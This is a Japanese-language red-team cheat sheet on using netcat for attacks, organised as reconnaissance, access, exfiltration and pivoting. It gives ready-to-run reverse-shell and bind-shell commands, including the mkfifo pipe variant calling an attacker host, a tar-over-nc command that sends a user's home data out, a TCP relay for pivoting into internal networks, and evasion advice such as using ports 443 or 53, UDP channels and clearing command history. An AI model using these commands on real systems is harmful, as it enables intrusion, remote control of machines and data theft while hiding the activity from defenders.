# Command - Linux - nc [Red Team Edition] - 侵入と支配の万能ナイフ

## 概要

レッドチームにおける `nc` は、ターゲット環境に「標準でインストールされている可能性が高い（Living off the Land）」強力な武器です。攻撃者はこれを用いて、ファイアウォールの穴を探し、シェルを奪い、盗み出したデータを外部へ流出させます。

---

## 1. 偵察と脆弱性調査 (Reconnaissance)

### 🕵️‍♂️ バナーグラビング

ポートが開いているだけでなく、そこで「何が動いているか（バージョン情報等）」を特定します。

* **テクニック**: 接続直後に空のパケットを送ることで、サーバーが返してくる応答ヘッダーを読み取ります。
* **コマンド**:
    ```bash
    # HTTPサーバーのバージョン情報を取得
    echo "" | nc -v -n -w 2 192.168.1.50 80
    ```

### 📡 ステルス性の低い高速スキャン

`nmap` がない環境でも、簡易的なポートスキャンを実行できます。

* **コマンド**:
    ```bash
    # 21番から80番ポートをスキャン（-z はデータを送らない）
    nc -zv 192.168.1.50 21-80
    ```

---

## 2. 権限奪取と維持 (Access & Persistence)

### 🔄 リバースシェルの構築 (最重要)

ターゲット（被害者）から攻撃者へ接続させる手法です。外向きの通信を許可しているファイアウォールを突破するのに有効です。

* **ケースA: 伝統的な Netcat (`-e` オプションあり)**
    ```bash
    # 攻撃者側で待ち受け
    nc -lvp 4444
    # ターゲット側で実行
    nc 1.2.3.4 4444 -e /bin/bash
    ```

* **ケースB: モダンな環境 (OpenBSD版など `-e` がない場合)**
    `mkfifo` (名前付きパイプ) を利用して、通信をシェルにリダイレクトさせます。
    ```bash
    # ターゲット側で実行（パイプによる擬似リバースシェル）
    mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f
    ```

### 🚪 バインドシェルの設置

ターゲット側でポートを開放し、攻撃者がそこへ接続して操作する手法です。

* **コマンド**:
    ```bash
    # ターゲット側で 4444 ポートを開放
    nc -lvp 4444 -e /bin/bash
    ```

---

## 3. 情報窃取 (Data Exfiltration)

### 📦 ファイルの隠密転送

ログやデータベースのバックアップを外部へ持ち出します。

* **テクニック**: 圧縮コマンドと組み合わせて、効率的にデータを流出させます。
* **コマンド**:
    ```bash
    # 攻撃者側（受信）
    nc -l -p 9999 > exfiltrated_data.tar.gz
    # ターゲット側（送信）
    tar czf - /home/user/data | nc 1.2.3.4 9999
    ```

---

## 4. 横展開とプロキシ (Pivoting)

### 🔗 TCP リレー (中継地点の作成)

侵入した踏み台サーバーを中継局にして、さらに内部のネットワークへ攻撃を届けます。

* **コマンド**:
    ```bash
    # 踏み台サーバーで実行。外部の 8888 への通信を、内部の 10.0.0.5:80 へ転送
    mkfifo backpipe
    nc -l -p 8888 0<backpipe | nc 10.0.0.5 80 1>backpipe
    ```

## 💡 レッドチームの秘匿テクニック

| 目的 | 工夫点 |
| :--- | :--- |
| **検知回避** | 標準のポート（4444等）を避け、443 (HTTPS) や 53 (DNS) などの「怪しくない」ポートを使用する。 |
| **UDP 活用** | TCP よりもフィルタリングが甘いことが多い UDP (`-u`) を使い、隠密な通信路を確保する。 |
| **ログ隠蔽** | `history -c` でコマンド履歴を消すか、エイリアスを避けて `/bin/nc` を直接呼ぶ。 |

> [!CAUTION]
> 現代の EDR (Endpoint Detection and Response) は、`nc` の実行、特に `-e` オプションや `mkfifo` を伴う不審なパイプラインを即座に検知し、プロセスを遮断します。侵入後は、まず環境にどのような監視が入っているかを確認してから `nc` を抜くべきです。
